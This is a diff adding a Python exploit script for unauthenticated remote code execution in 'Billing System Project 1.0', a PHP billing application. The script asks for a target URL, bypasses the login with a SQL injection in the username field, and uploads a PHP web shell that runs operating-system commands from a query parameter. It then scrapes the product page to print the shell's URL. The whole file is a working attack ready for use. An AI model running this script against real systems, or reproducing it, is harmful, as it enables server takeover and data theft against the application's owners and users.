@@ -1,0 +1,68 @@
+# Exploit Title: Billing System Project 1.0 - Remote Code Execution (RCE) (Unauthenticated)
+# Date: 06.07.2021
+# Exploit Author: Talha DEMİRSOY
+# Software Link: https://www.sourcecodester.com/php/14831/billing-system-project-php-source-code-free-download.html
+# Version: V 1.0
+# Tested on: Linux & Windows
+
+import requests
+import random
+import string
+from bs4 import BeautifulSoup
+
+let = string.ascii_lowercase
+shellname = ''.join(random.choice(let) for i in range(15))
+randstr = ''.join(random.choice(let) for i in range(15))
+
+payload= "<?php if(isset($_GET['cmd'])){ echo '<pre>'; $cmd =
+($_GET['cmd']); system($cmd); echo '</pre>'; die; } ?>"
+
+url = input("Target : ")
+
+session = requests.session()
+
+reqUrl = url + "login.php"
+reqHead = {"Content-Type": "application/x-www-form-urlencoded"}
+reqData = {"username": "admin' or '1'='1'#", "password": "-", "login": ''}
+session.post(reqUrl, headers=reqHead, data=reqData)
+
+print("Shell Uploading...")
+
+reqUrl = url + "php_action/createProduct.php"
+reqHead = {"Content-Type": "multipart/form-data;
+boundary=----WebKitFormBoundaryOGdnGszwuETwo6WB"}
+reqData =
+"\r\n\r\n------WebKitFormBoundaryOGdnGszwuETwo6WB\r\nContent-Disposition:
+form-data;
+name=\"currnt_date\"\r\n\r\n\r\n------WebKitFormBoundaryOGdnGszwuETwo6WB\r\nContent-Disposition:
+form-data; name=\"productImage\";
+filename=\""+shellname+".php\"\r\nContent-Type:
+application/octet-stream\r\n\r\n"+payload+"\r\n\r\n------WebKitFormBoundaryOGdnGszwuETwo6WB\r\nContent-Disposition:
+form-data;
+name=\"productName\"\r\n\r\n"+randstr+"_TalhaDemirsoy\r\n------WebKitFormBoundaryOGdnGszwuETwo6WB\r\nContent-Disposition:
+form-data;
+name=\"quantity\"\r\n\r\n1\r\n------WebKitFormBoundaryOGdnGszwuETwo6WB\r\nContent-Disposition:
+form-data;
+name=\"rate\"\r\n\r\n1\r\n------WebKitFormBoundaryOGdnGszwuETwo6WB\r\nContent-Disposition:
+form-data;
+name=\"brandName\"\r\n\r\n1\r\n------WebKitFormBoundaryOGdnGszwuETwo6WB\r\nContent-Disposition:
+form-data;
+name=\"categoryName\"\r\n\r\n2\r\n------WebKitFormBoundaryOGdnGszwuETwo6WB\r\nContent-Disposition:
+form-data;
+name=\"productStatus\"\r\n\r\n1\r\n------WebKitFormBoundaryOGdnGszwuETwo6WB\r\nContent-Disposition:
+form-data;
+name=\"create\"\r\n\r\n\r\n------WebKitFormBoundaryOGdnGszwuETwo6WB--\r\n"
+session.post(reqUrl, headers=reqHead, data=reqData)
+
+print("product name is "+randstr)
+print("shell name is "+shellname)
+
+reqUrl = url + "product.php"
+data = session.get(reqUrl)
+
+parser = BeautifulSoup(data.text, 'html.parser')
+find_shell = parser.find_all('img')
+
+for i in find_shell:
+    if shellname in i.get("src"):
+        print("Shell URL : " + url  + i.get("src") + "?cmd=whoami")
